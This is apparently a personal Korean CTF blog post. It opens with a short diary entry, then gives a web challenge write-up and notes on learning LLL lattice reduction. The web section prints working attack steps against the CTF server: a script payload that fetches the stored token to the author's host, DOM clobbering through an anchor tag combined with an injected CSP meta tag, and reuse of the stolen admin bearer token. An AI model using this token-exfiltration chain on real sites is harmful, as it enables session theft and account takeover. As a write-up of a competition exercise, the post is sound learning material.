## overall
토요일, 6 12 2025, 00:00 KST - 월요일, 8 12 2025, 00:00 KST
### Team Rank
* 11231 score
* #5
### diary
주말 내내 외식 한 번 한 거 빼고는 집에 처박혀있었는데 기본적으로의 이유는 추워서다 추워서.. 그러면 집 안은 안춥냐하면 집안이 더추운거같기도해... 놀지 않은것도 아닌데 금요일에 아현언니랑 데이트도 했는데도 왜 이렇게 뭔가 텐션이 다운되고 그랬을까

역시 겨울보다 여름이 좋다!!!! 여름엔 집에만 있어도 행복했는데 !! 
### web
`sb`
가입 endpoint가 숨겨져 있다
```
REQUEST
curl -X POST http://public.ctf.r0devnull.team:3009/auth/register -H "Content-Type: application/json" -d "{\"username\": \"viram\", \"password\": \"password123\"}"

RESPONSE
{"user":{"id":"ecde4a59-db79-4314-8da8-d94e3709afe3","username":"viram"}}
```
사실 블로그 포스트가 3개일텐데 flag포스트는 is_approved = false니까 관리자에게만 보이고, 관리자의 bearer token은 localStorage에서 인증되고 있다

이 블로그는 구글에서 검색유입을 더 활발하게 하기 위해 meta태그를 직접 입력할 수 있게 되어있는데 여기서 meta태그를 입력받은 그대로 박아버린다. 취약하긴 하지만 DomPurify로 특수문자들 <,>같은걸 검열을 잘 하고 있어서 그대로 js injection은 안된다.. (아마도?)

`test+"><script>fetch('https://viram.dev/callback?data='.concat(localStorage.getItem('token')))</script>` 이런 익스플로잇이 안된다는 뜻

/report를 누르면 다음과 같은 동작이 일어납니다
```
const response = await fetch(`${CONSTANTS.href}/report/${data.id}`, {
    method: "POST",
    headers: {
        Authorization: `Bearer ${token}`,
    },
});
```

여기서 CONSTANTS.href를 제 서버인 viram.dev으로 바꿔주고 싶은데 const CONSTANTS라서 못바꿈
```
document.getElementById("content").innerHTML = DOMPurify.sanitize(data.content, {
    ALLOWED_TAGS: ["b", "i", "a"], 
});
```
b, i, a태그만 허용되어있다

exploit
```
curl -X POST 'http://public.ctf.r0devnull.team:3009/create' \
  -H 'Content-Type: application/json' \
  -b 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3Njc1OTcyNjgsImlhdCI6MTc2NTAwNTI2OCwidXNlciI6eyJpZCI6ImVjZGU0YTU5LWRiNzktNDMxNC04ZGE4LWQ5NGUzNzA5YWZlMyJ9fQ.5OV1kiWHsJdi3plc_CgDvcrqfbiYKpzGa5IeJ3Q2Npk' \ 
  -d '{
    "title": "Localhost CSP Attack",
    "content": "<a id='\''CONSTANTS'\'' href='\''https://viram.dev'\''></a> Bot, Come here!",
    "meta": [
      {
        "http_equiv": "Content-Security-Policy",
        "content": "default-src '\''self'\''; script-src '\''unsafe-inline'\'' http://localhost:8000/static/tuicss/tuicss.js http://localhost:8000/static/dompurify/purify.min.js http://localhost:8000/static/js/utils.js; connect-src *;"
      }
    ]
  }'
```

constants.js를 제외한 다른 파일들은 CSP화이트리스트에 넣어두고 constants.js는 제외한 대신 viram.dev으로 바꿔치기

로컬호스트로 추가한이유는 report.rs에 보면 봇이 `driver.goto(format!("http://localhost:8000/{}", id)).await?;` 이런식으로 움직여서..

```
const POST_ID = "7d921e8e-8f32-46c6-bd6a-8fd98ca99d89"; 

fetch(`http://public.ctf.r0devnull.team:3009/report/${POST_ID}`, {
    method: "POST",
    headers: {
        "Authorization": "Bearer " + localStorage.getItem("token")
    }
}).then(console.log);
```

내 서버 viram.dev에 로깅이든 어떻게든 어드민의 bearer token이 남을거고 그 뒤는 뻔한 얘기
```
curl 'http://public.ctf.r0devnull.team:3009/'   -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3Njc1OTg5ODcsImlhdCI6MTc2NTAwNjk4NywidXNlciI6eyJpZCI6IjYzZTljNWRhLWU1N2MtNDQ0Mi1hNWU0LWNkMzUyYTFhNzU1YiJ9fQ.x-eLkjVX48azSBdqOmVjXxPq35R5fZYNBh2GjsdbZPM'                  

<div class="tui-window">
    <fieldset class="tui-fieldset">
        <legend class="white-255-text center">flag</legend>
        <div>nullctf{csp_15_u53ful_f0r_h4ck3r5_t00}</div> 
        <button class="tui-button">
            <a href="/e28ff9f8-f7f2-4b4a-a019-8a04e48c1924"><span class="yellow-255-text">V</span>iew</a>
        </button>
    </fieldset>
</div>
```
a태그만 이용해서 constants.js를 바꿔치기하려고 했다면 바꿔치기가 안됐을거임 const라서 그래서 const CONSTANTS를 선언하는 constants.js의 로드 자체를  CSP로 막아줬어야 했던 문제
### crypto
`i` lattice-based LLL 알고리즘이라는건 알겟는데 1. 그게뭔지 2. 이 문제에서 어떻게 그거를 drive해낼수있는지 몰으겠음

챗지피티 LLL알고리즘에 대해 설명해줘

챗지피티 LLL알고리즘에 대해 초등학생도 이해할수잇게 설명해줘

챗지피티 어쩌구

LLL이 뭔가 우리가 어떤 평면을 도출해 낼 때에는 서로 다른 벡터 두 개가 있어야 한다. 2차원은 2개의 벡터가 있어야 하고 3차원은 세 개의 벡터, 4차원은 네 개의 벡터...

같은 평면을 만드는 벡터는 무수히 많으나 어떤 벡터는 매우 길고 서로 거의 평행이라 평면을 계산해내기에 좋지 않다

그렇기에 LLL은 한 평면에 대하여 짧고 서로 거의 직교인 벡터를 찾고자 한다. (lettice reduction)

근데 그게 이문제랑 먼상관임? 문제 파일이 다른 맥북에 있어서 몰르겟다 사실 문제봐도 모를거같긴함